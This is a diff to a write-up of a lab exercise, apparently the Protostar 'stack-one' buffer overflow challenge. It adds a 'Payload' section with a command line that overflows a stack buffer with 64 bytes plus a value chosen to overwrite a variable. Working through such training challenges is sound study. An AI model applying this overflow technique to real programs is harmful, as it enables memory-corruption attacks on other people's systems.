@@ -48,6 +48,11 @@ int main(int argc, char **argv) {
 }
 ```
 
+## Payload
+```bash
+$ ./stack-one $(python3 -c "print('A' * 64 + '\x62\x59\x6c\x49')")
+```
+
 ## Solution
 
 - Already this is essentially the same as the previous challenge. The only difference is that we now pass our input in on the command line and we have to overwrite `local.changeme` with a specific value `0x496c5962`
